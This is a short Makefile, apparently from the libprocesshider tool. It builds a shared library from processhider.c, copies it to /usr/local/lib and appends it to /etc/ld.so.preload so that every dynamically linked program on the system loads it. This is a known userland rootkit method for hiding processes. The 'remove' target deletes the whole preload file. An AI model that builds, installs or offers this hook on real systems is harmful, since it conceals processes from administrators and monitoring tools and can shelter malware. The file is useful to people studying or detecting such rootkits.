all: libprocesshider.so move append

libprocesshider.so: processhider.c
	gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl

move:
	mv libprocesshider.so /usr/local/lib/

append:
	echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

remove:
	rm /usr/local/lib/libprocesshider.so
	rm /etc/ld.so.preload

.PHONY clean:
	rm -f libprocesshider.so
